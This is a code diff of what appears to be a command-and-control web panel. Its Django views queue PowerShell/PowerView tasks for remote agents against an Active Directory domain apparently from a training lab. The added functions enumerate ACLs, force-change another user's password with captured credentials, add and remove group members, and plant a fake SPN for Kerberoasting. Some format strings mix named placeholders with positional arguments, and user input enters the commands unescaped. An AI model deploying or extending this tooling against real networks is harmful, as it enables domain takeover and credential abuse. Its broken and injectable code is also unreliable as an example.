@@ -961,7 +961,7 @@ def InterestingACL_Enum(request):
 
 
 ##Working on it
-def UserACL(request):
+def SpecificACL_Enum_powerview(request):
     if request.method=='POST':
         agent = request.POST['agent']
         agentId = request.POST['agentId']
@@ -969,7 +969,7 @@ def UserACL(request):
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
         user = request.POST['user']
-        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Find-InterestingDomainAcl===============";import-module $env:userprofile\powerview.ps1;$sid = Convert-NameToSid {user};Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid};echo "++++++++++++++++++`r`n"'.format(user)
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============ACLs Enum===============";import-module $env:userprofile\powerview.ps1;$sid = Convert-NameToSid {user};Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid};echo "++++++++++++++++++`r`n"'.format(user)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -978,3 +978,141 @@ def UserACL(request):
 
     else:
         return render(request, 'blog/listeners.html')
+
+def ReverseSearch_and_Mapping_GUID(request):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
+        guid = request.POST['guid']
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Reverse Search & Mapping to a GUID Value===============";import-module $env:userprofile\Microsoft.ActiveDirectory.Management.dll;$guid="{}";Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like \'ControlAccessRight\'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid}|fl;echo "++++++++++++++++++`r`n"'.format(guid)
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return JsonResponse({},status=200)
+
+    else:
+        return render(request, 'blog/listeners.html')
+
+
+def NestedGroups_of_a_Group(request):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
+        groupname = request.POST['groupname']
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============NestedGroups_of_a_Group===============";import-module $env:userprofile\powerview.ps1;Get-DomainGroup -Identity "{}" | select memberof;echo "++++++++++++++++++`r`n"'.format(groupname)
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return JsonResponse({},status=200)
+
+    else:
+        return render(request, 'blog/listeners.html')
+
+def forceChangePass_DomainUserPassword(request):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
+        contoleduser = request.POST['contoleduser']
+        password = request.POST['password']
+        wanteduser = request.POST['wanteduser']
+        wantedpassword = request.POST['wantedpassword']
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Force Change Password===============";import-module $env:userprofile\powerview.ps1;$firstPassword =ConvertTo-SecureString \'{password}\' -AsPlainText -Force;$Cred =New-Object System.Management.Automation.PSCredential(\'INLANEFREIGHT\{contoleduser}\',$firstPassword);$secondPassword =ConvertTo-SecureString \'{wantedpassword}\' -AsPlainText -Force;Set-DomainUserPassword -Identity {wanteduser} -AccountPassword $secondPassword -Credential $Cred -Verbose;echo "++++++++++++++++++`r`n"'.format(password,contoleduser,wantedpassword,wanteduser)
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return JsonResponse({},status=200)
+
+    else:
+        return render(request, 'blog/listeners.html')
+
+def AddGroupMember(request):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
+        user = request.POST['user']
+        password = request.POST['password']
+        group = request.POST['group']
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Add Member to Group===============";import-module $env:userprofile\powerview.ps1;$secPassword =ConvertTo-SecureString \'{password}\' -AsPlainText -Force;$Cred =New-Object System.Management.Automation.PSCredential(\'INLANEFREIGHT\{user}\', $secPassword);Add-DomainGroupMember -Identity \'{group}\' -Members \'{user}\' -Credential $Cred -Verbose;echo "++++++++++++++++++`r`n"'.format(password,user,group)
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return JsonResponse({},status=200)
+
+    else:
+        return render(request, 'blog/listeners.html')
+
+def RmGroupMember(request):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
+        user = request.POST['user']
+        password = request.POST['password']
+        group = request.POST['group']
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Remove Group Member===============";import-module $env:userprofile\powerview.ps1;$secPassword =ConvertTo-SecureString \'{password}\' -AsPlainText -Force;$Cred =New-Object System.Management.Automation.PSCredential(\'INLANEFREIGHT\{user}\', $secPassword);Remove-DomainGroupMember -Identity "{group}" -Members "{user}" -Credential $Cred -Verbose;echo "++++++++++++++++++`r`n"'.format(password,user,group)
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return JsonResponse({},status=200)
+
+    else:
+        return render(request, 'blog/listeners.html')
+
+def CreateFake_SPN(request):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
+        user = request.POST['user']
+        password = request.POST['password']
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Createing Fake SPN===============";import-module $env:userprofile\powerview.ps1;$secPassword =ConvertTo-SecureString \'{password}\' -AsPlainText -Force;$Cred =New-Object System.Management.Automation.PSCredential(\'INLANEFREIGHT\{user}\', $secPassword);Set-DomainObject -Credential $Cred -Identity {user} -SET @{serviceprincipalname="notahacker/LEGIT"} -Verbose;echo "++++++++++++++++++`r`n"'.format(password,user)
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return JsonResponse({},status=200)
+
+    else:
+        return render(request, 'blog/listeners.html')
+
+
+def UserGeneralInfo(request):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
+        user = request.POST['user']
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Createing Fake SPN===============";import-module $env:userprofile\powerview.ps1;Get-DomainUser -Identity {user} ;echo "++++++++++++++++++`r`n"'.format(user)
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return JsonResponse({},status=200)
+
+    else:
+        return render(request, 'blog/listeners.html')
+
+
